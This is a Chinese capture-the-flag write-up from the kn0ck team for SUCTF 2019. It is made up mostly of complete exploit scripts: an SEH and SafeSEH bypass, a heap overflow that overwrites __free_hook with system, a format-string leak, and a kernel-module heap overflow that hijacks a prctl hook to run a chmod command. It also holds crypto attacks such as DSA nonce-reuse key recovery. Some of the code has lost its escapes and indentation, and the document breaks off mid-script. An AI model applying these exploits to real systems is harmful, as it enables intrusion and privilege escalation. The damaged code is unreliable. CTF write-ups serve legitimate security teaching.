@@ -1,0 +1,2128 @@
+# kn0ck suctf19 writeup
+
+阅读量 **464865**
+
+|评论 **5**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-08-26 16:00:32
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t010c62850a62a07ac2.jpg)
+
+> kn0ck诚招大佬，联系邮箱[kn0ck_team@protonmail.com](mailto:kn0ck_team@protonmail.com)
+
+## pwn
+
+###  BabyStack
+
+main函数的f5有点问题,所以直接看反汇编
+
+    
+    
+    .text:00408579                 mov     esp, [ebp+ms_exc.old_esp]
+    .text:0040857C                 call    sub_4033C8 ;这个函数里面有getflag的代码段,先想想怎么进去
+    发现00408579地址是异常处理函数
+    而在text:00408542 loc_408542:                             ; CODE XREF: sub_4083E0:loc_40853C↑p
+    .text:00408542                 pop     eax
+    .text:00408543                 mov     esi, [ebp+var_2C]
+    .text:00408546                 sub     esi, eax
+    .text:00408548                 div     esi
+    .text:0040854A                 pop     eax
+    .text:0040854B                 push    offset aYouCanNotFindM ; "You can not find Me!n"
+    .text:00408550                 call    printf
+    
+
+有div指令,应该是除0异常触发,因为输入只能输入8字节,否则报错退出,  
+要求esi=0,就必须要求esi==eax,此时的eax刚好是前面一个call的返回值,也就是00408541,由于程序开启了aslr,所以就利用到了泄露出来的main函数地址了,需要动态根据前面的算法构造出输入的8字节.
+
+407F60这个函数里面有任意地址读取,读取异常的话进行异常处理函数会直接退出.
+
+当输入no的时候会判断2个初始值为1的局部变量的和是否==3,==才getflag,否则退出
+
+现在是怎么改掉这2个值  
+sub_402C70((int)&v11, 256, (int)v1);这个函数可以让v11溢出,可以修改返回地址,但是不能修改掉2个局部变量,
+可函数退出的地方都是exit,不是正常退出,好像也无法劫持eip
+
+    
+    
+    .text:00408224 loc_408224:                             ; DATA XREF: .rdata:stru_47ACC0↓o
+    .text:00408224                 mov     eax, 1
+    .text:00408229                 retn
+    
+
+这里是个正常返回的地方,但是是在异常处理函数里面,前面有jmp直接跳过它,又不能直接运行到这里来,想想看能否触发异常来到这里.
+触发异常来到这里后发现esp已经改掉了,还是无法劫持eip
+
+换思路,可以直接通过修改seh中的函数指针,由于泄露了栈,所以可以保证seh链是完整的绕过sehop.覆盖第一个seh链为getflag函数,再触发异常  
+但是好像还有safeseh相关保护需要绕过…………
+
+根据这篇文章<https://bbs.pediy.com/thread-221016.htm> 绕过safeseh  
+最后一个坑,浪费了好多时间,最后的scope_addr后面的0不能被破坏,不然直接退出,经过调试发现会有个换行符插进去了,补上他们就好了
+
+    
+    
+    from pwn import *
+    import string
+    t = remote('121.40.159.66', 6666)
+    #t = remote('1.1.8.1', 9999)
+    
+    def calc_esi(ret_addr):
+        ret_addr = hex(ret_addr)[2:].zfill(8)
+        esi = ''
+        for i in ret_addr:
+            if i in '1234567890':
+                esi+=chr(ord(i)+3)
+            elif i in string.ascii_letters:
+                esi+=chr(ord(i)+55)
+        return esi
+    #通过第一阶段验证
+    print t.recvuntil('stack address = ')
+    stack_addr = t.recvline()[2:-2]
+    print stack_addr
+    stack_addr = int(stack_addr,16)
+    print t.recvuntil('main address = ')
+    main_addr = t.recvline()[2:-2]
+    print main_addr
+    main_addr_num = int(main_addr,16)
+    ret_addr = main_addr_num+0x4be3
+    esi = calc_esi(ret_addr)
+    print 'esi= ',esi
+    #esi = hex(ret_addr)[2:].zfill(8)
+    t.sendline(esi)
+    
+    #泄露seh_next
+    print t.recvuntil('to know more?')
+    t.sendline('yes')
+    print t.recvuntil('do you want to know?')
+    seh_next_addr = stack_addr-(0x19ff10-0x19fee0)
+    print 'seh_next_addr: ',hex(seh_next_addr)
+    t.sendline(str(seh_next_addr))
+    print t.recvuntil('value is 0x')
+    seh_next = t.recvuntil('rn')[:-2]
+    print 'seh_next: ',seh_next
+    seh_next = int(seh_next,16)
+    
+    #泄露seh_next后面的seh_handler
+    print t.recvuntil('to know more?rn')
+    t.sendline('yes')
+    print t.recvuntil('do you want to know?rn')
+    handler_addr = stack_addr-(0x19ff10-0x19fee4)
+    print 'handler: ',hex(handler_addr)
+    t.sendline(str(handler_addr))
+    print t.recvuntil('value is 0x')
+    handler = t.recvuntil('rn')[:-2]
+    print 'handler: ',handler
+    handler = int(handler,16)
+    
+    #泄露栈上面的gscookie
+    print t.recvuntil('to know more?rn')
+    t.sendline('yes')
+    print t.recvuntil('do you want to know?rn')
+    cookie = stack_addr-(0x19ff10-0x19fed4)
+    print 'cookie addr: ',hex(cookie)
+    t.sendline(str(cookie))
+    print t.recvuntil('value is 0x')
+    cookie = t.recvuntil('rn')[:-2]
+    print 'cookie: ',cookie
+    cookie = int(cookie,16)
+    
+    #泄露security cookie
+    print t.recvuntil('to know more?rn')
+    t.sendline('yes')
+    print t.recvuntil('do you want to know?rn')
+    sc = 0x47C004-0x40395e+ main_addr_num
+    print 'sc addr: ',hex(sc)
+    t.sendline(str(sc))
+    print t.recvuntil('value is ')
+    sc = t.recvuntil('rn')[2:-2]
+    
+    print 'sc: ',sc
+    sc = int(sc,16)
+    
+    
+    #计算ebp
+    ebp = stack_addr-(0x19ff10-0x19fef0)
+    print 'ebp: ',hex(ebp)
+    
+    #计算buf地址,计算scope指针
+    buf_addr = stack_addr-(0x19FF10-0x019FE44)
+    print 'buf_addr:', hex(buf_addr)
+    scope_addr = (buf_addr+4)^sc
+    print 'scope_addr: ',hex(scope_addr)
+    print t.recvuntil('to know more?rn')
+    t.sendline('1')
+    
+    '''
+    payload 
+    '''
+    
+    getflag_addr = main_addr_num+0x0408266-0x40395E#计算getflag地址
+    payload = 'aaaa'
+    #把fake scope放在后4字节是因为之后会输入yes破坏前4字节
+    payload += 'xE4xFFxFFxFFx00x00x00x00x0CxFFxFFxFFx00x00x00x00xFExFFxFFxFF'+p32(getflag_addr)*2
+    #padding
+    payload +='x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x31x31x31x00x32x31x32x00x00x00x00x00x00x00x00x00'
+    payload +=p32(cookie)+'3'*8+p32(seh_next)+p32(handler)+p32(scope_addr)+p32(0)+p32(ebp)
+    
+    
+    print(len(payload))
+    t.sendline(payload)
+    
+    
+    
+    print t.recvuntil('you want to know more?rn')
+    t.sendline('yes')
+    print t.recvuntil('n')
+    t.sendline('111')#再次触发异常,进入getflag代码
+    print t.interactive()
+    
+
+###  二手破电脑
+
+此题先看两个函数，`malloc_usable_size` 和 `realloc`。
+
+在linux下，使用 `man malloc_useable_size` 即可快速查看函数定义、用法等。
+
+    
+    
+    The malloc_usable_size() function returns the number of usable bytes in the block pointed to by ptr, a pointer
+           to a block of memory allocated by malloc(3) or a related function.
+    
+
+再看看源码，大概就是，32位系统下，如果堆块是inuse的，就返回堆块大小-4，否则返回堆块大小-8。
+
+`realloc` 就有意思了，按照源码，是先 `malloc` ，然后 `memcpy` 再 `free`，实测该程序并不会进行 `malloc` 或者
+`free`，因为大小没改变，但是对堆块的 `size` 进行了检查。
+
+然后查找漏洞，漏洞不太明显，在 `perchase` 函数的 `scanf` 函数处，例如 `%8s`
+这样的格式化字符串，实际会写入9个字节，因为有最后一个 `x00` 会被写进去。
+
+解题思路：
+
+  * 利用 `unsorted bin` 泄露堆地址
+  * 伪造 `pre_inuse` ，利用一字节溢出，修改下一堆块的`inuse` 标志位
+  * 利用 `free` 的向前合并，造成堆块的 `overlap`
+  * 篡改某一结构体的 `name` 指针，使其指向一个伪造的堆块，堆块位置自身结构体之前，且大小符合条件
+  * 调用 `rename` 函数，`realloc` 后 `name` 指针通过检查，写入数据即可再次修改 `name` 指针至 `__free_hook` 处，接下来还有一次对 `name` 指针进行写的机会，写入 `system` 即可。
+
+关于libc，吐槽一下主办方用的非主流libc：libc6-i386_2.23-0ubuntu10_amd64.so
+
+另外有个serial需要解一下
+
+    
+    
+    for ( i = 0; i <= 6; ++i )
+      buf[i] = ((buf[i] | buf[i + 1]) & ~(buf[i] & buf[i + 1]) | i) & ~((buf[i] | buf[i + 1]) & ~(buf[i] & buf[i + 1]) & i)
+    //buf = "Qf(>qwd!"
+    
+
+用python反着解开
+
+    
+    
+    buf = '!'
+    final_buf = "Qf(>qwd!"
+    for _ in range(7):
+        cur = ord(buf[0])
+        i = 6 - _
+        for pre in range(256):
+            if ord(final_buf[i]) == ((pre | cur) & ~(pre & cur) | i) & ~((pre | cur) & ~(pre & cur) & i):
+                buf = chr(pre) + buf
+                continue
+    
+    print buf
+    # e4SyD1C!
+    
+
+exp如下，具体的堆排列情况，我都是实时调的，大家可以参考一下我的文章[interactive-pwnning-tutorial](https://github.com/matrix1001/interactive-pwnning-tutorial)。
+
+    
+    
+    #https://github.com/matrix1001/welpwn
+    from PwnContext import *
+    
+    if __name__ == '__main__':        
+        context.terminal = ['tmux', 'splitw', '-h']
+        #context.log_level = 'debug'
+        # functions for quick script
+        s       = lambda data               :ctx.send(str(data))        #in case that data is an int
+        sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
+        sl      = lambda data               :ctx.sendline(str(data)) 
+        sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
+        r       = lambda numb=4096          :ctx.recv(numb)
+        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
+        irt     = lambda                    :ctx.interactive()
+        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
+        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
+        # misc functions
+        uu32    = lambda data   :u32(data.ljust(4, ''))
+        uu64    = lambda data   :u64(data.ljust(8, ''))
+    
+        ctx.binary = './pwn'
+        ctx.remote = ('47.111.59.243', 10001)
+        #ctx.custom_lib_dir = './glibc-all-in-one/libs/2.23-0ubuntu10_i386/'
+        ctx.remote_libc = './libc6-i386_2.23-0ubuntu10_amd64.so'
+        ctx.debug_remote_libc = True
+    
+    
+        def perchase(name_len, name, price):
+            sla('>>>', 1)
+            sla('length', name_len)
+            sa('Name', name)
+            sla('Price', price)
+    
+        def comment(idx, comment, score):
+            sla('>>>', 2)
+            sla('Index', idx)
+            sa('Comment', comment)
+            sla('score', score)
+    
+        def throw(idx):
+            sla('>>>', 3)
+            sla('index', idx)
+    
+        def rename(idx, new_name, some_fuck):
+            sla('>>>', 4)
+            sla('index', idx)
+            sleep(0.1)
+            s(new_name)
+            sa('power', 'yn')
+            sla('serial', 'e4SyD1C!')
+            sa('Pwner', some_fuck)
+    
+        ctx.breakpoints = [0x12f2, 0x1328, 0x118f]
+        rs('remote')
+        # rs()
+        libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
+        # dbg('c')
+    
+        perchase(0x10, 'testn', 0) #0
+        comment(0, 'testcommentn', 0)
+        perchase(0x10, 'testn', 0) #1
+        throw(0)
+    
+        perchase(0x10, 'testn', 0) #0
+        comment(0, 'a', 0)
+        throw(0)
+    
+        ru('Comment ')
+        libc_leak = uu32(r(4)) & 0xffffff00
+    
+        success('libc_leak = {:#x}'.format(libc_leak))
+        libc_base = libc_leak - 0x1b0700
+    
+        # clean up
+        throw(1)
+    
+        #
+        perchase(0x8c, 'an', 0) #0
+        perchase(0x80, 'an', 0) #1
+        perchase(0x40, 'an', 0) #2
+        perchase(0xf8, 'an', 0) #3
+        perchase(0x20, 'topn', 0) #4
+    
+        throw(2)
+        # null overflow
+        perchase(0x44, 'a'*0x40 + p32(0x190) + 'n', 0) #2
+        throw(0)
+        # overlap
+        throw(3)
+    
+        perchase(0x10, 'an', 0) #0
+        perchase(0x50, 'an', 0)
+    
+        perchase(0x100, p32(0) + p32(0x31) + p32(0) + p32(0x239) + ''*0x14 + 'n', 0) 
+    
+        throw(0)
+        perchase(0x100, '/bin/shn', 0)
+        libc.address = libc_base
+        free_hook = libc.sym['__free_hook']
+        system = libc.sym['system']
+        rename(1, p32(0)*5 + p32(free_hook), p32(system))
+        irt()
+    
+
+###  playfmt
+
+是一个很简单的格式串，但是buf放在了bss，需要栈指针链，由于flag已经在内存里面了，泄露一下堆地址，再把flag地址写到栈里面，就可以利用格式化字符串漏洞拿flag了。
+
+    
+    
+    #https://github.com/matrix1001/welpwn
+    from PwnContext import *
+    
+    try:
+        from IPython import embed as ipy
+    except ImportError:
+        print ('IPython not installed.')
+    
+    if __name__ == '__main__':        
+        context.terminal = ['tmux', 'splitw', '-h']
+        context.log_level = 'debug'
+        # functions for quick script
+        s       = lambda data               :ctx.send(str(data))        #in case that data is an int
+        sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
+        sl      = lambda data               :ctx.sendline(str(data)) 
+        sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
+        r       = lambda numb=4096          :ctx.recv(numb)
+        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
+        irt     = lambda                    :ctx.interactive()
+        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
+        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
+        # misc functions
+        uu32    = lambda data   :u32(data.ljust(4, ''))
+        uu64    = lambda data   :u64(data.ljust(8, ''))
+    
+        ctx.binary = './playfmt'
+        ctx.custom_lib_dir = '/root/share/project/glibc-all-in-one/libs/2.23-0ubuntu11_i386/'
+        ctx.debug_remote_libc = True
+        ctx.remote = ('120.78.192.35', 9999)
+        def fmt(payload):
+            sleep(0.2)
+            s(payload)
+        rs('remote')
+    
+        sleep(1)
+        ctx.clean()
+        fmt('%18$x')
+        heap_leak = int(r(), 16)
+        flag_addr = heap_leak - 0x18
+    
+        flag_addr_c = p32(flag_addr)
+    
+        for i in range(4):
+            fmt('%{}c%6$hhn'.format(i+0xf0))
+            fmt('%{}c%14$hhn'.format(ord(flag_addr_c[i])))
+        fmt('%240c%6$hhn')        
+    
+        dbg('b *0x0804889Fnc')
+    
+        sleep(1)
+        ctx.clean()
+        fmt('%6$x')
+        stack = int(ru(8), 16)
+    
+        addup = (0xf0 - (stack & 0xff))/4
+    
+        fmt('%240c%6$hhn%{}$s'.format(addup+14))
+        r()
+    
+
+###  sudrv
+
+[参考文章](https://bbs.pediy.com/thread-225488.htm)
+
+具体思路和参考文章是一样的。
+
+此次利用分两段完成，首先编写一个简单的leak用来泄露kernel
+base，然后再利用模块中的堆溢出漏洞达到任意地址写的目的，劫持prctl的hook，来调用poweroff_work_func来执行’/bin/chmod
+777 /flag’
+
+leak.c
+
+    
+    
+    //leak.c
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <sys/types.h>
+    #include <errno.h>
+    #include <sys/stat.h>
+    #include <sys/ioctl.h>
+    #include <fcntl.h>
+    #include <string.h>
+    #include <pty.h>
+    #include <sys/mman.h>
+    #include <sys/ipc.h>
+    #include <sys/sem.h>
+    
+    #define to_kmalloc 0x73311337
+    #define to_kfree 0x13377331
+    #define to_show 0xdeadbeef
+    
+    void exploit(){
+        char buf[0x100] = {0};
+        char test[] = "hello world!%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx";
+        memcpy(buf,test,sizeof(test));
+    
+        int fd1 = open("/dev/meizijiutql", O_RDWR);
+        ioctl(fd1,to_kmalloc,0x500);
+        write(fd1,buf,sizeof(buf));
+        ioctl(fd1,to_show);
+        ioctl(fd1,to_kfree);
+    }
+    
+    
+    int main(int argc, char const *argv[])
+    {
+        /* code */
+        exploit();
+        return 0;
+    }
+    
+
+exp.c
+
+    
+    
+    //exp.c
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <sys/types.h>
+    #include <errno.h>
+    #include <sys/stat.h>
+    #include <sys/ioctl.h>
+    #include <fcntl.h>
+    #include <string.h>
+    #include <pty.h>
+    #include <sys/mman.h>
+    #include <sys/ipc.h>
+    #include <sys/sem.h>
+    
+    #define to_kmalloc 0x73311337
+    #define to_kfree 0x13377331
+    #define to_show 0xdeadbeef
+    
+    int main(int argc, char const *argv[])
+    {
+        unsigned long kernel_base;
+        puts("input kernel addr:");
+        scanf("%lu",&kernel_base);
+        kernel_base -= 0x1c827f;
+        unsigned long set_memory_rw = kernel_base + 0x54870;
+        unsigned long selinux_disable = kernel_base + 0x31ebc0;
+        unsigned long sbin_poweroff = kernel_base + 0x1241d40;
+        unsigned long security_task_prctl = kernel_base + 0x3134e0;
+        unsigned long hook_addr = kernel_base + 0x12934a8;
+        unsigned long orderly_poweroff = kernel_base + 0x81b10;
+        unsigned long poweroff_work_func = kernel_base + 0x82000;
+    
+        printf("kernel_base = %pn", kernel_base);
+        printf("set_memory_rw = %pn", set_memory_rw);
+        printf("selinux_disable = %pn", selinux_disable);
+        printf("sbin_poweroff = %pn", sbin_poweroff);
+        printf("security_task_prctl = %pn", security_task_prctl);
+        printf("hook_addr = %pn", hook_addr);
+        printf("orderly_poweroff = %pn", orderly_poweroff);
+        printf("poweroff_work_func = %pn", poweroff_work_func);
+    
+        int fd1 = open("/dev/meizijiutql", O_RDWR);
+        ioctl(fd1,to_kmalloc,0xc0);
+    
+        unsigned long fake[0x19] = {0};
+        fake[0x18] = sbin_poweroff;
+        write(fd1,(char *)fake,sizeof(fake));
+    
+        ioctl(fd1,to_kmalloc,0xc0);
+        ioctl(fd1,to_kmalloc,0xc0);//get addr
+    
+        char cmd[] = "/bin/chmod 777 /flag";
+    
+        write(fd1,cmd,sizeof(cmd));
+    
+        ioctl(fd1,to_kmalloc,0x100);
+        unsigned long fake2[0x21] = {0};
+        fake2[0x20] = hook_addr;
+        write(fd1,(char *)fake2,sizeof(fake2));
+    
+        ioctl(fd1,to_kmalloc,0x100);
+        ioctl(fd1,to_kmalloc,0x100);//get addr
+    
+        unsigned long addr = sbin_poweroff;
+    
+        unsigned long fake_table[4] = {0};
+        fake_table[3] = selinux_disable;
+    
+        unsigned long *p = &fake_table;
+        write(fd1,&p,8);
+        //prctl(addr,2,addr,addr,2);//do selinux_disable
+    
+        fake_table[3] = poweroff_work_func;
+    
+        prctl(addr,2,addr,addr,2);//do poweroff_work_func
+        return 0;
+    }
+    
+
+## Crypto
+
+###  DSA
+
+与题目所给地址进行交互，回显出DSA签名算法的参数p,q,g,y,并给出对12组语句MD5值的签名的结果(r,s)，求解私钥x。  
+观察到所给的签名结果中，存在两组数据的r相同,说明这两组数据签名时采取了相同的随机数k，原理参考[https://www.jarviswang.me/?p=169，可以解除相应私钥x，之后用x加密所给的md5值提供给服务器就ok](https://www.jarviswang.me/?p=169%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%A3%E9%99%A4%E7%9B%B8%E5%BA%94%E7%A7%81%E9%92%A5x%EF%BC%8C%E4%B9%8B%E5%90%8E%E7%94%A8x%E5%8A%A0%E5%AF%86%E6%89%80%E7%BB%99%E7%9A%84md5%E5%80%BC%E6%8F%90%E4%BE%9B%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B0%B1ok).  
+计算脚本如下：  
+DSA.py
+
+    
+    
+    from random import randrange
+    from hashlib import sha1
+    from gmpy2 import xmpz, to_binary, invert, powmod, is_prime
+    
+    
+    def generate_p_q(L, N):
+    g = N  # g >= 160
+    n = (L - 1) // g
+    b = (L - 1) % g
+    while True:
+    # generate q
+    while True:
+    s = xmpz(randrange(1, 2 ** (g)))
+    a = sha1(to_binary(s)).hexdigest()
+    zz = xmpz((s + 1) % (2 ** g))
+    z = sha1(to_binary(zz)).hexdigest()
+    U = int(a, 16) ^ int(z, 16)
+    mask = 2 ** (N - 1) + 1
+    q = U | mask
+    if is_prime(q, 20):
+    break
+    # generate p
+    i = 0  # counter
+    j = 2  # offset
+    while i < 4096:
+    V = []
+    for k in range(n + 1):
+    arg = xmpz((s + j + k) % (2 ** g))
+    zzv = sha1(to_binary(arg)).hexdigest()
+    V.append(int(zzv, 16))
+    W = 0
+    for qq in range(0, n):
+    W += V[qq] * 2 ** (160 * qq)
+    W += (V[n] % 2 ** b) * 2 ** (160 * n)
+    X = W + 2 ** (L - 1)
+    c = X % (2 * q)
+    p = X - c + 1  # p = X - (c - 1)
+    if p >= 2 ** (L - 1):
+    if is_prime(p, 10):
+    return p, q
+    i += 1
+    j += n + 1
+    
+    
+    def generate_g(p, q):
+    while True:
+    h = randrange(2, p - 1)
+    exp = xmpz((p - 1) // q)
+    g = powmod(h, exp, p)
+    if g > 1:
+    break
+    return g
+    
+    
+    def generate_keys(g, p, q):
+    x = randrange(2, q)  # x < q
+    y = powmod(g, x, p)
+    return x, y
+    
+    
+    def generate_params(L, N):
+    p, q = generate_p_q(L, N)
+    g = generate_g(p, q)
+    return p, q, g
+    
+    
+    def sign(M, p, q, g, x):
+    if not validate_params(p, q, g):
+    raise Exception("Invalid params")
+    while True:
+    k = randrange(2, q)  # k < q
+    r = powmod(g, k, p) % q
+    m = M #int(sha1(M).hexdigest(), 16)
+    try:
+    s = (invert(k, q) * (m + x * r)) % q
+    return r, s
+    except ZeroDivisionError:
+    pass
+    
+    
+    def verify(M, r, s, p, q, g, y):
+    if not validate_params(p, q, g):
+    raise Exception("Invalid params")
+    if not validate_sign(r, s, q):
+    return False
+    try:
+    w = invert(s, q)
+    except ZeroDivisionError:
+    return False
+    m =M # int(sha1(M).hexdigest(), 16)
+    u1 = (m * w) % q
+    u2 = (r * w) % q
+    # v = ((g ** u1 * y ** u2) % p) % q
+    v = (powmod(g, u1, p) * powmod(y, u2, p)) % p % q
+    if v == r:
+    return True
+    return False
+    
+    
+    def validate_params(p, q, g):
+    if is_prime(p) and is_prime(q):
+    return True
+    if powmod(g, q, p) == 1 and g > 1 and (p - 1) % q:
+    return True
+    return False
+    
+    
+    def validate_sign(r, s, q):
+    if r < 0 and r > q:
+    return False
+    if s < 0 and s > q:
+    return False
+    return True
+    
+    
+    if __name__ == "__main__":
+    N = 160
+    L = 1024
+    p, q, g = generate_params(L, N)
+    x, y = generate_keys(g, p, q)
+    
+    text = "MISIS rocks"
+    M = str.encode(text, "ascii")
+    r, s = sign(M, p, q, g, x)
+    if verify(M, r, s, p, q, g, y):
+    print('All ok')
+    print M, r, s, p, q, g, y, x
+    
+
+wp.py
+
+    
+    
+    import DSA
+    import gmpy2
+    p = 89884656743115795725606614650159225690277841481502595853919197404142682654587633619443529337107618458139040334633197494177921687649471369499213716567752381328547433890099679870655669164451442682253794104184449101557496697367969882087186435421957492974255167534286662485855407981652149026488559437814307020371
+    q = 1229497345621183758814993469191332519500506868989
+    g = 58529698759563737634016334033537212867717849333012189004643018841270428563683093483006045477112444680372809385830948207442567847485491504701629757805667159000252791001714694507655949691684409083802508920193939674609121001281446700059723241202517422540626419233721451721744085470000121912567840671207537526982
+    y = 29489506469114296742770625557066000814217646414802633238412133010472159016957098846919012455018753959989276570368282336480069171767524057901394863984285974673733305792863550044443246228204503645686034468583054261755376390851531080847708812880601981651112161391132712064024801647437927228982784350971270864172
+    
+    md51 = 193111848988193367504523557345609960681
+    out1 =[891788218480967205838238368504390622327899630141L, 1071869941763049920072685934641936261427117475133L]
+    md52 = 76447611971473350019028042637993930502
+    out2 =[891788218480967205838238368504390622327899630141L, 1185662127967437283367637521307280915897562273383L]
+    if DSA.verify(md51, out1[0], out1[1], p, q, g, y):
+    print('All ok')
+    if DSA.verify(md52, out2[0], out2[1], p, q, g, y):
+    print('All ok')
+    m3 = md51
+    m4 = md52
+    s3 = out1[1]
+    s4 = out2[1]
+    r = out1[0]
+    ds = s4 - s3
+    dm = m4 - m3
+    k = gmpy2.mul(dm, gmpy2.invert(ds, q))
+    k = gmpy2.f_mod(k, q)
+    tmp = gmpy2.mul(k, s3) - m3
+    x = tmp * gmpy2.invert(r, q)
+    x = gmpy2.f_mod(x, q)
+    print int(x)
+    
+    M = 334436397493699539473999398012751306876
+    r, s = DSA.sign(M, p, q, g, x)
+    print '('+str(r)+'L'+', '+str(s)+'L'+')'
+    
+
+###  Prime
+
+这题应该算是卡的最久的了，题目给出了4组 m^n mod n = c,n的生成方式未知,已知n ,c 求解 m ，看起来像是一个RSA的解密
+。与RSA相关联的是欧拉定理，根据欧拉定理可知，  
+m^phi(n) mod n ==1，  
+结合题目的条件可得：  
+m^(n mod phi(n)) mod n =c  
+下面就是尝试分解n,发现给出的4个n两两不互素，每个n可以分解成4个素数的乘积，随后对多素数的RSA进行解密，参考<https://www.xuebuyuan.com/681378.html>  
+交互脚本如下：
+
+    
+    
+    from  pwn import *
+    import gmpy2
+    t = remote('47.111.59.243', 8003)
+    proof = t.recvline()
+    print proof
+    check  = proof[-6:-1]
+    salt = proof[-20:-16]
+    for i in range(10000000):
+    if hashlib.md5(str(i)+salt).hexdigest()[0:5] == check:
+    break
+    t.sendline(str(i))
+    cs = [0] * 4
+    ns = [0] * 4
+    cs[0] = int(t.recvline()[10:-2],16)
+    ns[0] = int(t.recvline()[10:-2],16)
+    cs[1] = int(t.recvline()[10:-2],16)
+    ns[1] = int(t.recvline()[10:-2],16)
+    cs[2] = int(t.recvline()[10:-2],16)
+    ns[2] = int(t.recvline()[10:-2],16)
+    cs[3] = int(t.recvline()[10:-2],16)
+    ns[3] = int(t.recvline()[10:-2],16)
+    print t.recvuntil('=')
+    m = [0] *4
+    print 'start!'
+    p = [[0 for i in range(4)] for j in range(4)]
+    p[0][1] = gmpy2.gcd(ns[0], ns[1])
+    p[0][2] = gmpy2.gcd(ns[0], ns[2])
+    p[0][3] = gmpy2.gcd(ns[0], ns[3])
+    p[0][0] = ns[0]/(p[0][1]*p[0][2]*p[0][3])
+    p[1][1] = gmpy2.gcd(ns[0], ns[1])
+    p[1][2] = gmpy2.gcd(ns[1], ns[2])
+    p[1][3] = gmpy2.gcd(ns[1], ns[3])
+    p[1][0] = ns[1]/(p[1][1]*p[1][2]*p[1][3])
+    p[2][1] = gmpy2.gcd(ns[2], ns[1])
+    p[2][2] = gmpy2.gcd(ns[0], ns[2])
+    p[2][3] = gmpy2.gcd(ns[2], ns[3])
+    p[2][0] = ns[2]/(p[2][1]*p[2][2]*p[2][3])
+    p[3][1] = gmpy2.gcd(ns[3], ns[1])
+    p[3][2] = gmpy2.gcd(ns[3], ns[2])
+    p[3][3] = gmpy2.gcd(ns[0], ns[3])
+    p[3][0] = ns[3]/(p[3][1]*p[3][2]*p[3][3])
+    phi = [0]*4
+    i = 0
+    for i in range(4):
+    phi[i] = (p[i][0]-1)*(p[i][1]-1)*(p[i][2]-1)*(p[i][3]-1)
+    
+    d = [0]*4
+    e = [0]*4
+    for i in range(4):
+    e[i] = ns[i]%phi[i]
+    d[i] = gmpy2.invert(e[i], phi[i])
+    for i  in range(4):
+    tmp1 = pow(cs[i],d[i],ns[i])
+    tmp2= pow(tmp1,e[i],ns[i])
+    if tmp2 == cs[i]:
+    t.sendline(str(hex(tmp1)[2:]))
+    if i!=3:
+    print t.recvuntil('=')
+    else:
+    print t.recvline()
+    
+
+###  MT
+
+题目主要是对以下一段逻辑进行逆向，
+
+    
+    
+    def convert(m):
+    m = m ^ m >> 13
+    m = m ^ m << 9 & 2029229568 #0x78f39600
+    m = m ^ m << 17 & 2245263360 #0x85d40000
+    m = m ^ m >> 19
+    return m
+    
+
+4个步骤，一步一步分析，按位解即可，这里直接给出计算脚本：
+
+    
+    
+    from Crypto.Random import random
+    from Crypto.Util import number
+    #from flag import flag
+    
+    def uncover(m):
+    m = m ^ m >> 19
+    #print m
+    k1 = 0x85d40000
+    low17 = m &((1<<17)-1)
+    low15 = (m &((1<<15)-1)) << 17
+    m = (m ^ (k1 & low15))
+    #print m
+    k2 = 0x78f39600
+    low9 = m &((1<<9)-1)
+    low29 = ((m >> 9) ^ (k2 >> 9 & low9))&((1<<9)-1)
+    low39 = ((m >> 18) ^ (k2 >> 18 & low29))&((1<<9)-1)
+    low49 = ((m >> 27) ^ (k2 >> 27 & low39)) & ((1 << 5) - 1)
+    m = low9 +(low29 <<9) + (low39 <<18) +(low49 << 27)
+    #print m
+    high13 = m >> 19
+    mid13 = high13 ^ (m >> 6 &((1<<13)-1))
+    low6 = (mid13 >>7) ^(m  &((1<<6)-1))
+    m = low6 + (mid13<< 6) + (high13 << 19)
+    #print m
+    #return m
+    return number.long_to_bytes(m, 4)
+    
+    def transform(message):
+    assert len(message) % 4 == 0
+    new_message = ''
+    for i in range(len(message) / 4):
+    block = message[i * 4 : i * 4 +4]
+    block = number.bytes_to_long(block)
+    block = convert(block)
+    block = number.long_to_bytes(block, 4)
+    new_message += block
+    return new_message
+    
+    # transformed_flag: 641460a9 e3953b1a aa21f3a2
+    
+    msg = uncover(0x641460a9)+ uncover(0xe3953b1a)+uncover(0xaa21f3a2)
+    print msg.encode('hex')
+    
+
+###  RSA
+
+题目给出 n, e, c，可以发送密文，让服务器判断相应明文是否为奇数，利⽤ RSA PARITY
+ORACLE⽅法，这次构造特定密文交互1024次可以求出特定明文，执行三轮，服务器返回flag，  
+原理参考<https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/#rsa-parity-oracle>  
+交互脚本如下：
+
+    
+    
+    from  pwn import *
+    import gmpy2
+    
+    
+    def parity_oracle(n):
+    """input: n: the modulus of the RSA
+    query: query is a function which inputs an int i, returns if the m*(2^i)%n is odd
+    return: int m
+    """
+    i = 0
+    x = 0
